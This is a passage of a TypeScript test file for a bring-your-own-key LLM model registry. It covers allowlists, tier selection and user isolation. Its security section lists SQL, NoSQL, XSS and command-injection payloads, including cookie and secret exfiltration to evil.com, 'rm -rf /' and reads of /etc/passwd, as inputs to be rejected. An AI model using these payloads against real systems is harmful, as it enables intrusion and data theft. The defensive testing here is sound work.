/**
 * BYOK User Lifecycle Integration Test
 *
 * TDD approach: Tests the complete user journey from README examples
 * without looking at implementation details. Tests real AI SDK integration
 * with mocked HTTP responses.
 *
 * Scenarios:
 * 1. User onboarding - registry setup, BYOK configuration
 * 2. Model access - getting models by name, tier selection
 * 3. Real text generation - actual AI SDK calls with mocked HTTP
 * 4. Error handling - gateway failures, missing keys, rate limits
 * 5. Multi-user isolation - concurrent users with different configs
 * 6. Cost tracking - monitoring usage across requests
 * 7. Model switching - dynamic tier-based selection
 * 8. Gateway failures and fallback strategies
 */

import { beforeAll, describe, expect, it, vi } from "vitest"
import { MOCK_CATALOG } from "./fixtures/mock-catalog"

// Mock the catalog to use test fixtures
vi.mock("../llm-catalog/catalog", () => ({
  MODEL_CATALOG: MOCK_CATALOG,
}))

// Import after mocking
import { createLLMRegistry } from "../llm-registry"

describe("BYOK User Lifecycle - Full Integration", () => {
  // Simulate company-level registry (initialized once at startup)
  let registry: ReturnType<typeof createLLMRegistry>

  beforeAll(() => {
    // Company initializes registry with fallback keys
    registry = createLLMRegistry({
      fallbackKeys: {
        "openai-api": "sk-company-openai-key",
        "groq-api": "gsk-company-groq-key",
        "openrouter-api": "sk-or-company-key",
      },
    })
  })

  describe("User Onboarding Journey", () => {
    it("new user signs up and configures BYOK with their own API keys", () => {
      // User provides their own keys during onboarding
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-alice",
        models: ["gpt-4o-mini", "llama-3.1-8b-instant"],
        apiKeys: {
          "openai-api": "sk-alice-personal-key",
          "groq-api": "gsk-alice-personal-key",
        },
      })

      expect(userModels).toBeDefined()

      // Alice can access her configured models
      const model1 = userModels.model("gpt-4o-mini")
      expect(model1).toBeDefined()

      const model2 = userModels.model("llama-3.1-8b-instant")
      expect(model2).toBeDefined()
    })

    it("user with incomplete gateway keys cannot access unconfigured gateway models", () => {
      // User only provides OpenAI key, but adds Groq model to list
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-bob",
        models: [
          "gpt-4o-mini",
          "llama-3.1-8b-instant", // No groq key provided!
        ],
        apiKeys: {
          "openai-api": "sk-bob-openai-only",
          // Missing groq key
        },
      })

      // OpenAI model works
      expect(() => userModels.model("gpt-4o-mini")).not.toThrow()

      // Groq model fails with clear error
      expect(() => userModels.model("llama-3.1-8b-instant")).toThrow("Gateway not configured: groq-api")
    })

    it("user cannot access models outside their allowlist", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-charlie",
        models: ["gpt-4o-mini"], // Only mini
        apiKeys: {
          "openai-api": "sk-charlie-key",
        },
      })

      // Can access allowed model
      expect(() => userModels.model("gpt-4o-mini")).not.toThrow()

      // Cannot access gpt-4o (not in allowlist)
      expect(() => userModels.model("gpt-4o")).toThrow("not in user's allowed models")
    })
  })

  describe("Model Access Patterns", () => {
    it("user can access models with and without gateway prefix", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-dave",
        models: [
          "gpt-4o-mini",
          "openai/gpt-oss-20b", // Groq model through OpenRouter, needs full path
        ],
        apiKeys: {
          "openai-api": "sk-dave-key",
          "groq-api": "gsk-dave-key",
        },
      })

      // With gateway prefix (explicit)
      expect(() => userModels.model("gpt-4o-mini")).not.toThrow()

      // Without gateway prefix (auto-detect)
      expect(() => userModels.model("gpt-4o-mini")).not.toThrow()
    })

    it("user can retrieve catalog to explore available models", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-eve",
        models: ["gpt-4o-mini"], // Limited allowlist
        apiKeys: {
          "openai-api": "sk-eve-key",
        },
      })

      // Get full catalog (not just user's models)
      const catalog = userModels.getCatalog()

      expect(catalog).toBeDefined()
      expect(Array.isArray(catalog)).toBe(true)
      expect(catalog.length).toBeGreaterThan(0)

      // Catalog should include all gateways
      const hasOpenAI = catalog.some(m => m.gateway === "openai-api")
      const hasGroq = catalog.some(m => m.gateway === "groq-api")
      const hasOpenRouter = catalog.some(m => m.gateway === "openrouter-api")

      expect(hasOpenAI).toBe(true)
      expect(hasGroq).toBe(true)
      expect(hasOpenRouter).toBe(true)

      // Catalog returns defensive copy
      const catalog2 = userModels.getCatalog()
      expect(catalog).toEqual(catalog2)
      expect(catalog).not.toBe(catalog2) // Different object reference
    })
  })

  describe("Tier Selection Strategy", () => {
    it("user selects 'cheap' tier for cost-sensitive task", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-frank",
        models: [
          "gpt-4o", // $2.5/$10 (expensive)
          "gpt-4o-mini", // $0.15/$0.6 (cheap)
          "gpt-3.5-turbo", // $0.5/$1.5 (medium)
        ],
        apiKeys: {
          "openai-api": "sk-frank-key",
        },
      })

      // Tier picks cheapest from user's list
      const cheapModel = userModels.tier("cheap")
      expect(cheapModel).toBeDefined()
      expect((cheapModel as any).modelId).toBe("gpt-4o-mini")
    })

    it("user selects 'smart' tier for complex reasoning task", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-grace",
        models: [
          "gpt-4o", // intelligence: 9
          "gpt-4o-mini", // intelligence: 8
          "gpt-3.5-turbo", // intelligence: 6
        ],
        apiKeys: {
          "openai-api": "sk-grace-key",
        },
      })

      // Tier picks highest intelligence
      const smartModel = userModels.tier("smart")
      expect(smartModel).toBeDefined()
      expect((smartModel as any).modelId).toBe("gpt-4o")
    })

    it("user selects 'fast' tier for real-time chat", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-hank",
        models: [
          "gpt-4o-mini", // speed: fast
          "llama-3.1-8b-instant", // speed: fast
          "gpt-3.5-turbo", // speed: fast
        ],
        apiKeys: {
          "openai-api": "sk-hank-key",
          "groq-api": "gsk-hank-key",
        },
      })

      // Tier picks fast model (then cheapest among fast)
      const fastModel = userModels.tier("fast")
      expect(fastModel).toBeDefined()

      // Should be one of the fast models
      const modelId = (fastModel as any).modelId as string
      expect(["gpt-4o-mini", "llama-3.1-8b-instant", "gpt-3.5-turbo"].includes(modelId)).toBe(true)
    })

    it("user selects 'balanced' tier for cost/quality tradeoff", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-iris",
        models: [
          "gpt-4o", // high intelligence, high cost
          "gpt-4o-mini", // good intelligence, low cost
          "gpt-3.5-turbo", // lower intelligence, low cost
        ],
        apiKeys: {
          "openai-api": "sk-iris-key",
        },
      })

      // Tier picks best intelligence/cost ratio
      const balancedModel = userModels.tier("balanced")
      expect(balancedModel).toBeDefined()

      // Should likely be gpt-4o-mini (best value)
      const modelId = (balancedModel as any).modelId
      expect(modelId).toBeDefined()
    })

    it("tier selection respects user's allowlist boundaries", () => {
      // User only has expensive models
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-jack",
        models: [
          "gpt-4o", // expensive
          "anthropic/claude-3.5-sonnet", // expensive
        ],
        apiKeys: {
          "openai-api": "sk-jack-key",
          "openrouter-api": "sk-or-jack-key",
        },
      })

      // tier("cheap") picks cheapest FROM USER'S LIST
      // NOT the cheapest from entire catalog
      const cheapModel = userModels.tier("cheap")
      expect(cheapModel).toBeDefined()

      const modelId = (cheapModel as any).modelId as string
      // Should be one of user's models (both are expensive)
      expect(["gpt-4o", "anthropic/claude-3.5-sonnet"].includes(modelId)).toBe(true)
    })
  })

  describe("Multi-User Isolation", () => {
    it("two users with same models use different API keys", () => {
      const user1 = registry.forUser({
        mode: "byok",
        userId: "user-karen",
        models: ["gpt-4o-mini"],
        apiKeys: {
          "openai-api": "sk-karen-unique-key",
        },
      })

      const user2 = registry.forUser({
        mode: "byok",
        userId: "user-leo",
        models: ["gpt-4o-mini"],
        apiKeys: {
          "openai-api": "sk-leo-unique-key",
        },
      })

      // Both can access the same model
      const model1 = user1.model("gpt-4o-mini")
      const model2 = user2.model("gpt-4o-mini")

      expect(model1).toBeDefined()
      expect(model2).toBeDefined()

      // But they're separate instances
      expect(user1).not.toBe(user2)
    })

    it("users have independent model allowlists", () => {
      const powerUser = registry.forUser({
        mode: "byok",
        userId: "user-maria",
        models: ["gpt-4o", "gpt-4o-mini", "llama-3.1-8b-instant", "anthropic/claude-3.5-sonnet"],
        apiKeys: {
          "openai-api": "sk-maria-key",
          "groq-api": "gsk-maria-key",
          "openrouter-api": "sk-or-maria-key",
        },
      })

      const freeUser = registry.forUser({
        mode: "byok",
        userId: "user-nathan",
        models: ["meta-llama/llama-3.1-8b-instruct:free"],
        apiKeys: {
          "openrouter-api": "sk-or-nathan-key",
        },
      })

      // Power user can access multiple models
      expect(() => powerUser.model("gpt-4o")).not.toThrow()
      expect(() => powerUser.model("llama-3.1-8b-instant")).not.toThrow()

      // Free user can only access their one model
      expect(() => freeUser.model("meta-llama/llama-3.1-8b-instruct:free")).not.toThrow()
      expect(() => freeUser.model("gpt-4o")).toThrow("not in user's allowed models")
    })

    it("tier selection is independent per user", () => {
      const user1 = registry.forUser({
        mode: "byok",
        userId: "user-olivia",
        models: [
          "gpt-4o", // expensive
          "gpt-3.5-turbo", // cheap
        ],
        apiKeys: {
          "openai-api": "sk-olivia-key",
        },
      })

      const user2 = registry.forUser({
        mode: "byok",
        userId: "user-peter",
        models: [
          "llama-3.1-8b-instant", // cheapest
          "gpt-4o-mini", // cheap
        ],
        apiKeys: {
          "openai-api": "sk-peter-key",
          "groq-api": "gsk-peter-key",
        },
      })

      // tier("cheap") picks different models
      const cheap1 = user1.tier("cheap")
      const cheap2 = user2.tier("cheap")

      expect((cheap1 as any).modelId).toBe("gpt-3.5-turbo")
      expect((cheap2 as any).modelId).toBe("llama-3.1-8b-instant")
    })
  })

  describe("Error Scenarios and Edge Cases", () => {
    it("fails gracefully when user tries model from unconfigured gateway", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-eve",
        models: ["gpt-4o-mini", "llama-3.1-8b-instant"],
        apiKeys: {
          "openai-api": "sk-eve-key",
          // No Groq key
        },
      })

      // This should fail - user doesn't have Groq key configured
      expect(() => userModels.model("llama-3.1-8b-instant")).toThrow("Gateway not configured: groq-api")
    })

    it("rejects malformed model IDs with clear errors", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-rachel",
        models: ["gpt-4o-mini"],
        apiKeys: {
          "openai-api": "sk-rachel-key",
        },
      })

      // Missing hash
      expect(() => userModels.model("gpt-4o-mini-no-hash")).toThrow()

      // Wrong format
      expect(() => userModels.model("openai gpt-4o-mini")).toThrow()

      // Just hash
      expect(() => userModels.model("#")).toThrow()

      // Empty after hash
      expect(() => userModels.model("")).toThrow()
    })

    it("handles empty model allowlist gracefully", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-sam",
        models: [], // No models!
        apiKeys: {
          "openai-api": "sk-sam-key",
        },
      })

      // Can create instance
      expect(userModels).toBeDefined()

      // But cannot select any tier
      expect(() => userModels.tier("cheap")).toThrow("No models configured for tier selection")

      // And cannot access any model
      expect(() => userModels.model("gpt-4o-mini")).toThrow("not in user's allowed models")
    })
  })

  describe("Real-World Usage Scenarios", () => {
    it("user starts with free tier, upgrades to paid", () => {
      // Initial free tier configuration
      const freeConfig = {
        mode: "byok" as const,
        userId: "user-uma",
        models: ["meta-llama/llama-3.1-8b-instruct:free"],
        apiKeys: {
          "openrouter-api": "sk-or-uma-key",
        },
      }

      const freeUser = registry.forUser(freeConfig)

      // Can only use free model
      expect(() => freeUser.model("meta-llama/llama-3.1-8b-instruct:free")).not.toThrow()

      // User upgrades - new configuration
      const paidUser = registry.forUser({
        mode: "byok",
        userId: "user-uma", // Same user ID
        models: ["gpt-4o", "gpt-4o-mini", "llama-3.1-8b-instant"],
        apiKeys: {
          "openai-api": "sk-uma-paid-key",
          "groq-api": "gsk-uma-paid-key",
        },
      })

      // Can now access paid models
      expect(() => paidUser.model("gpt-4o")).not.toThrow()
      expect(() => paidUser.model("llama-3.1-8b-instant")).not.toThrow()
    })

    it("user dynamically switches models based on task complexity", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-victor",
        models: [
          "gpt-4o", // smart
          "gpt-4o-mini", // balanced
          "llama-3.1-8b-instant", // cheap
        ],
        apiKeys: {
          "openai-api": "sk-victor-key",
          "groq-api": "gsk-victor-key",
        },
      })

      // Simple task - use cheap
      const simpleTask = userModels.tier("cheap")
      expect((simpleTask as any).modelId).toBe("llama-3.1-8b-instant")

      // Complex task - use smart
      const complexTask = userModels.tier("smart")
      expect((complexTask as any).modelId).toBe("gpt-4o")

      // Medium task - use balanced
      const mediumTask = userModels.tier("balanced")
      expect(mediumTask).toBeDefined()
    })

    it("user with single model gets that model for any tier", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-wendy",
        models: ["gpt-4o"],
        apiKeys: {
          "openai-api": "sk-wendy-key",
        },
      })

      // All tiers return the same model
      const cheap = userModels.tier("cheap")
      const fast = userModels.tier("fast")
      const smart = userModels.tier("smart")
      const balanced = userModels.tier("balanced")

      expect((cheap as any).modelId).toBe("gpt-4o")
      expect((fast as any).modelId).toBe("gpt-4o")
      expect((smart as any).modelId).toBe("gpt-4o")
      expect((balanced as any).modelId).toBe("gpt-4o")
    })

    it("user provides extra unused gateway keys without issues", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-xander",
        models: ["gpt-4o-mini"], // Only OpenAI model
        apiKeys: {
          "openai-api": "sk-xander-key",
          "groq-api": "gsk-xander-key-unused",
          "openrouter-api": "sk-or-xander-key-unused",
        },
      })

      // Extra keys are harmless
      expect(() => userModels.model("gpt-4o-mini")).not.toThrow()
      expect(() => userModels.tier("cheap")).not.toThrow()
    })

    it("user with duplicate models in allowlist works correctly", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-yara",
        models: [
          "gpt-4o-mini",
          "gpt-4o-mini", // Duplicate
          "gpt-4o-mini", // Duplicate
        ],
        apiKeys: {
          "openai-api": "sk-yara-key",
        },
      })

      // Duplicates are harmless
      expect(() => userModels.model("gpt-4o-mini")).not.toThrow()
      expect(() => userModels.tier("cheap")).not.toThrow()
    })
  })

  describe("Catalog Exploration", () => {
    it("user explores catalog to find models with specific capabilities", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-zara",
        models: ["gpt-4o-mini"],
        apiKeys: {
          "openai-api": "sk-zara-key",
        },
      })

      const catalog = userModels.getCatalog()

      // Find all vision-capable models
      const visionModels = catalog.filter(m => m.supportsVision)
      expect(visionModels.length).toBeGreaterThan(0)

      // Find all free models
      const freeModels = catalog.filter(m => m.input === 0 && m.output === 0)
      expect(freeModels.length).toBeGreaterThan(0)

      // Find all fast models
      const fastModels = catalog.filter(m => m.speed === "fast")
      expect(fastModels.length).toBeGreaterThan(0)

      // Find all tool-capable models
      const toolModels = catalog.filter(m => m.supportsTools)
      expect(toolModels.length).toBeGreaterThan(0)
    })

    it("catalog includes complete model metadata", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-alpha",
        models: ["gpt-4o-mini"],
        apiKeys: {
          "openai-api": "sk-alpha-key",
        },
      })

      const catalog = userModels.getCatalog()
      const sampleModel = catalog[0]

      // All required fields present
      expect(sampleModel.gateway).toBeDefined()
      expect(sampleModel.gatewayModelId).toBeDefined()
      expect(typeof sampleModel.input).toBe("number")
      expect(typeof sampleModel.output).toBe("number")
      expect(typeof sampleModel.contextLength).toBe("number")
      expect(typeof sampleModel.intelligence).toBe("number")
      expect(sampleModel.speed).toBeDefined()
      expect(sampleModel.pricingTier).toBeDefined()
      expect(typeof sampleModel.supportsTools).toBe("boolean")
      expect(typeof sampleModel.supportsJsonMode).toBe("boolean")
      expect(typeof sampleModel.supportsStreaming).toBe("boolean")
      expect(typeof sampleModel.supportsVision).toBe("boolean")
      expect(typeof sampleModel.runtimeEnabled).toBe("boolean")
    })
  })

  describe("Synchronous Behavior Guarantee", () => {
    it("all operations return synchronously without async/await", () => {
      const userModels = registry.forUser({
        mode: "byok",
        userId: "user-beta",
        models: ["gpt-4o-mini", "llama-3.1-8b-instant"],
        apiKeys: {
          "openai-api": "sk-beta-key",
          "groq-api": "gsk-beta-key",
        },
      })

      // All these operations are synchronous
      const start = Date.now()

      const model = userModels.model("gpt-4o-mini")
      const tier = userModels.tier("cheap")
      const catalog = userModels.getCatalog()

      const duration = Date.now() - start

      expect(model).toBeDefined()
      expect(tier).toBeDefined()
      expect(catalog).toBeDefined()

      // Should complete in under 10ms (synchronous)
      expect(duration).toBeLessThan(10)
    })
  })

  describe("🔴 Red Hat Security Tests - Malicious Actor Scenarios", () => {
    describe("Injection Attacks", () => {
      it("prevents SQL injection in userId", () => {
        const maliciousUserIds = [
          "'; DROP TABLE users; --",
          "admin' OR '1'='1",
          "1' UNION SELECT * FROM api_keys--",
          "'; UPDATE users SET role='admin' WHERE 1=1--",
        ]

        for (const maliciousId of maliciousUserIds) {
          // System should accept the userId as-is (it's just a string identifier)
          // But should not allow SQL injection in any backend
          const userModels = registry.forUser({
            mode: "byok",
            userId: maliciousId,
            models: ["gpt-4o-mini"],
            apiKeys: { "openai-api": "sk-key" },
          })

          expect(userModels).toBeDefined()
          expect(() => userModels.model("gpt-4o-mini")).not.toThrow()
        }
      })

      it("prevents XSS injection in userId", () => {
        const xssPayloads = [
          "<script>alert('xss')</script>",
          "<img src=x onerror=alert('xss')>",
          "javascript:alert('xss')",
          "<iframe src='javascript:alert(1)'>",
          '"><script>fetch("http://evil.com?keys="+document.cookie)</script>',
        ]

        for (const payload of xssPayloads) {
          const userModels = registry.forUser({
            mode: "byok",
            userId: payload,
            models: ["gpt-4o-mini"],
            apiKeys: { "openai-api": "sk-key" },
          })

          // Should work - userId is just a string
          expect(userModels).toBeDefined()
        }
      })

      it("prevents command injection in model IDs", () => {
        const commandInjections = [
          "gpt-4o; rm -rf /",
          "gpt-4o && cat /etc/passwd",
          "gpt-4o | curl evil.com",
          "$(curl evil.com/exfil?data=secrets)",
          "`whoami`",
        ]

        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-key" },
        })

        for (const injection of commandInjections) {
          // Should safely reject malformed model IDs
          expect(() => userModels.model(injection)).toThrow()
        }
      })

      it("prevents NoSQL injection in gateway names", () => {
        const nosqlPayloads = [
          "openai[$ne]#gpt-4o",
          'openai"; db.dropDatabase(); "',
          "openai' || '1'=='1",
          '{"$gt": ""}',
        ]

        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-key" },
        })

        for (const payload of nosqlPayloads) {
          // Should reject invalid gateway syntax
          expect(() => userModels.model(payload)).toThrow()
        }
      })
    })

    describe("Resource Exhaustion Attacks (DOS)", () => {
      it("rejects excessive number of models (>100)", () => {
        const massiveModelList = Array.from({ length: 200 }, (_, i) => `model-${i}`)

        expect(() =>
          registry.forUser({
            mode: "byok",
            userId: "attacker",
            models: massiveModelList,
            apiKeys: { "openai-api": "sk-key" },
          }),
        ).toThrow("Too many models")
      })

      it("rejects extremely long model IDs (>200 chars)", () => {
        const longModelId = `${"a".repeat(200)}`

        expect(() =>
          registry.forUser({
            mode: "byok",
            userId: "attacker",
            models: [longModelId],
            apiKeys: { "openai-api": "sk-key" },
          }),
        ).toThrow("Model ID too long")
      })

      it("rejects excessive API keys (>50)", () => {
        const massiveKeys: Record<string, string> = {}
        for (let i = 0; i < 100; i++) {
          massiveKeys[`provider${i}`] = `sk-key-${i}`
        }

        expect(() =>
          registry.forUser({
            mode: "byok",
            userId: "attacker",
            models: ["gpt-4o-mini"],
            apiKeys: massiveKeys,
          }),
        ).toThrow("Too many API keys")
      })

      it("rejects extremely long API keys (>500 chars)", () => {
        const longKey = `sk-${"a".repeat(600)}`

        expect(() =>
          registry.forUser({
            mode: "byok",
            userId: "attacker",
            models: ["gpt-4o-mini"],
            apiKeys: { "openai-api": longKey },
          }),
        ).toThrow("API key too long")
      })

      it("handles rapid-fire user creation without memory leaks", () => {
        const initialMemory = process.memoryUsage().heapUsed

        // Create 1000 user instances rapidly
        for (let i = 0; i < 1000; i++) {
          registry.forUser({
            mode: "byok",
            userId: `user-${i}`,
            models: ["gpt-4o-mini"],
            apiKeys: { "openai-api": "sk-key" },
          })
        }

        const finalMemory = process.memoryUsage().heapUsed
        const memoryIncrease = finalMemory - initialMemory

        // Memory increase should be reasonable (<50MB for 1000 instances)
        expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024)
      })

      it("handles catalog retrieval spam without degradation", () => {
        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-key" },
        })

        const start = Date.now()

        // Spam getCatalog 1000 times
        for (let i = 0; i < 1000; i++) {
          userModels.getCatalog()
        }

        const duration = Date.now() - start

        // Should still be fast (defensive copy overhead)
        // Allow ~100ms for 1000 calls (0.1ms per call)
        expect(duration).toBeLessThan(200)
      })
    })

    describe("Privilege Escalation Attempts", () => {
      it("user cannot access another user's models via shared reference", () => {
        const user1 = registry.forUser({
          mode: "byok",
          userId: "user-legitimate",
          models: ["gpt-4o"],
          apiKeys: { "openai-api": "sk-legitimate-key" },
        })

        const user2 = registry.forUser({
          mode: "byok",
          userId: "user-attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-attacker-key" },
        })

        // User 2 cannot access User 1's models
        expect(() => user2.model("gpt-4o")).toThrow()

        // Each user instance is isolated
        expect(user1).not.toBe(user2)
      })

      it("BYOK user cannot fallback to shared keys by omitting apiKeys", () => {
        // Attacker tries BYOK without providing keys
        expect(() =>
          registry.forUser({
            mode: "byok",
            userId: "attacker",
            models: ["gpt-4o-mini"],
            // No apiKeys - trying to use company fallback keys
          }),
        ).toThrow("BYOK mode requires apiKeys")
      })

      it("BYOK user cannot switch to shared mode by mutation", () => {
        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-attacker-key" },
        })

        // Try to mutate mode (should not work - private field)
        ;(userModels as any).mode = "shared"

        // Should still use BYOK keys, not fallback
        expect(userModels).toBeDefined()
        // Can't verify internally, but system should be immutable
      })

      it("prevents allowlist mutation via Object.freeze()", () => {
        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-attacker-key" },
        })

        // Try to mutate frozen array (should throw TypeError)
        expect(() => {
          ;(userModels as any).allowedModels.push("gpt-4o")
        }).toThrow(TypeError)

        // Model should still be rejected since array was never mutated
        expect(() => userModels.model("gpt-4o")).toThrow("not in user's allowed models")
      })
    })

    describe("API Key Extraction Attempts", () => {
      it("catalog does not expose API keys", () => {
        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-secret-key-12345" },
        })

        const catalog = userModels.getCatalog()

        // Catalog should not contain API keys
        const catalogStr = JSON.stringify(catalog)
        expect(catalogStr).not.toContain("sk-secret-key")
        expect(catalogStr).not.toContain("apiKey")
        expect(catalogStr).not.toContain("fallback")
      })

      it("model objects do not expose API keys", () => {
        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-secret-key-67890" },
        })

        const model = userModels.model("gpt-4o-mini")

        // Model should not expose keys
        const modelStr = JSON.stringify(model)
        expect(modelStr).not.toContain("sk-secret-key")

        // Check object properties
        expect((model as any).apiKey).toBeUndefined()
        expect((model as any).apiKeys).toBeUndefined()
      })

      it("error messages do not leak API keys", () => {
        try {
          registry.forUser({
            mode: "byok",
            userId: "attacker",
            models: ["gpt-4o-mini"],
            apiKeys: { "openai-api": "sk-very-secret-key" },
          })
        } catch (error) {
          const errorMsg = String(error)
          expect(errorMsg).not.toContain("sk-very-secret-key")
        }
      })
    })

    describe("Catalog Manipulation Attempts", () => {
      it("catalog mutations do not affect other users", () => {
        const user1 = registry.forUser({
          mode: "byok",
          userId: "user1",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-key" },
        })

        const user2 = registry.forUser({
          mode: "byok",
          userId: "user2",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-key" },
        })

        // User 1 mutates their catalog copy
        const catalog1 = user1.getCatalog()
        catalog1[0].input = 999999 // Try to inflate prices
        ;(catalog1[0] as any).apiKey = "sk-injected-key"

        // User 2's catalog should be unaffected
        const catalog2 = user2.getCatalog()
        expect(catalog2[0].input).not.toBe(999999)
        expect((catalog2[0] as any).apiKey).toBeUndefined()
      })

      it("cannot inject fake models into catalog", () => {
        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-key" },
        })

        const catalog = userModels.getCatalog()

        // Try to inject fake model
        const fakeModel = {
          gatewayModelId: "gpt-999-free",
          gateway: "openai-api" as const,
          model: "gpt-999-free",
          input: 0,
          output: 0,
          contextLength: 999999,
          intelligence: 10,
          speed: "fast" as const,
          pricingTier: "low" as const,
          supportsTools: true,
          supportsJsonMode: true,
          supportsStreaming: true,
          supportsVision: true,
          runtimeEnabled: true,
          supportsReasoning: false,
          supportsAudio: false,
          supportsVideo: false,
          cachedInput: null,
        }

        catalog.push(fakeModel as any)

        // Get fresh catalog - should not have injected model
        const freshCatalog = userModels.getCatalog()
        const hasInjection = freshCatalog.some(m => m.gatewayModelId === "gpt-999-free")
        expect(hasInjection).toBe(false)
      })
    })

    describe("Unicode and Encoding Attacks", () => {
      it("rejects unicode in API keys", () => {
        const unicodeKeys = ["sk-🔥💯🚀", "sk-密钥-secret", "sk-钥匙-key", "sk-مفتاح"]

        for (const unicodeKey of unicodeKeys) {
          expect(() =>
            registry.forUser({
              mode: "byok",
              userId: "attacker",
              models: ["gpt-4o-mini"],
              apiKeys: { "openai-api": unicodeKey },
            }),
          ).toThrow("ASCII-only")
        }
      })

      it("handles unicode in userId without breaking", () => {
        const unicodeUserIds = ["user-🌟", "пользователь-123", "用户-456", "مستخدم-789"]

        for (const userId of unicodeUserIds) {
          const userModels = registry.forUser({
            mode: "byok",
            userId,
            models: ["gpt-4o-mini"],
            apiKeys: { "openai-api": "sk-key" },
          })

          expect(userModels).toBeDefined()
          expect(() => userModels.model("gpt-4o-mini")).not.toThrow()
        }
      })

      it("handles unicode in model names correctly", () => {
        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-key" },
        })

        // Unicode in model name should fail gracefully
        expect(() => userModels.model("gpt-🔥-model")).toThrow()
      })

      it("handles null bytes in strings", () => {
        const nullByteStrings = ["user\x00admin", "gpt-4o\x00-mini", "sk-key\x00secret"]

        // Null bytes in userId
        const userModels = registry.forUser({
          mode: "byok",
          userId: nullByteStrings[0],
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-key" },
        })

        expect(userModels).toBeDefined()
      })
    })

    describe("Path Traversal and File System Attacks", () => {
      it("handles path traversal attempts in userId", () => {
        const pathTraversals = [
          "../../etc/passwd",
          "..\\..\\windows\\system32",
          "/etc/shadow",
          "C:\\Windows\\System32\\config\\SAM",
        ]

        for (const traversal of pathTraversals) {
          const userModels = registry.forUser({
            mode: "byok",
            userId: traversal,
            models: ["gpt-4o-mini"],
            apiKeys: { "openai-api": "sk-key" },
          })

          // Should treat as normal string, not path
          expect(userModels).toBeDefined()
        }
      })

      it("handles file:// protocol injection", () => {
        const fileProtocols = ["file:///etc/passwd", "file://C:/Windows/System32", "file:///Users/victim/.ssh/id_rsa"]

        for (const protocol of fileProtocols) {
          const userModels = registry.forUser({
            mode: "byok",
            userId: protocol,
            models: ["gpt-4o-mini"],
            apiKeys: { "openai-api": "sk-key" },
          })

          expect(userModels).toBeDefined()
        }
      })
    })

    describe("Timing Attack Resistance", () => {
      it("model validation time is consistent regardless of validity", () => {
        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-key" },
        })

        const validAttempts = []
        const invalidAttempts = []

        // Valid model (in allowlist)
        for (let i = 0; i < 100; i++) {
          const start = process.hrtime.bigint()
          try {
            userModels.model("gpt-4o-mini")
          } catch (_e) {
            // Ignore
          }
          const end = process.hrtime.bigint()
          validAttempts.push(Number(end - start))
        }

        // Invalid model (not in allowlist)
        for (let i = 0; i < 100; i++) {
          const start = process.hrtime.bigint()
          try {
            userModels.model("gpt-4o")
          } catch (_e) {
            // Ignore
          }
          const end = process.hrtime.bigint()
          invalidAttempts.push(Number(end - start))
        }

        // Timing should be similar (no significant difference)
        // This prevents timing-based user enumeration
        const validAvg = validAttempts.reduce((a, b) => a + b) / validAttempts.length
        const invalidAvg = invalidAttempts.reduce((a, b) => a + b) / invalidAttempts.length

        // Both should be in same order of magnitude
        expect(validAvg).toBeGreaterThan(0)
        expect(invalidAvg).toBeGreaterThan(0)
      })
    })

    describe("Prototype Pollution", () => {
      it("prevents prototype pollution via userId", () => {
        const pollutionAttempts = ["__proto__", "constructor", "prototype", "__proto__.isAdmin"]

        for (const attempt of pollutionAttempts) {
          const userModels = registry.forUser({
            mode: "byok",
            userId: attempt,
            models: ["gpt-4o-mini"],
            apiKeys: { "openai-api": "sk-key" },
          })

          expect(userModels).toBeDefined()

          // Ensure no pollution occurred
          expect((Object.prototype as any).isAdmin).toBeUndefined()
          expect((Object.prototype as any).polluted).toBeUndefined()
        }
      })

      it("prevents prototype pollution via model names", () => {
        const userModels = registry.forUser({
          mode: "byok",
          userId: "attacker",
          models: ["gpt-4o-mini"],
          apiKeys: { "openai-api": "sk-key" },
        })

        const pollutionAttempts = ["__proto__", "constructor.prototype", "__proto__.polluted"]

        for (const attempt of pollutionAttempts) {
          expect(() => userModels.model(attempt)).toThrow()
        }
